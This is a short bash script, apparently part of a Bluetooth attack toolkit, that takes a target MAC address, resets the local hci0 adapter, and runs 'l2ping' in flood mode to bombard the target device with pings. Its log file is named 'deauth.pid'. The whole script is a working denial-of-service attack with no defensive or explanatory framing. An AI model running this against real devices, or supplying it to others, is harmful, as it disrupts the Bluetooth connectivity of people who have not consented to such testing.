#!/bin/bash

# File configuration
LOG_DIR="../logfiles/btlogs"
PID_FILE="$LOG_DIR/deauth.pid"
MAC=$1

# Make log directory if it does not exist
mkdir -p "$LOG_DIR"

# Bring Bluetooth adaptor up and down to prevent errors
sudo hciconfig hci0 down
sudo hciconfig hci0 up

# Flood Bluetooth MAC address with pings
sudo l2ping -i hci0 -s 666 -f $MAC
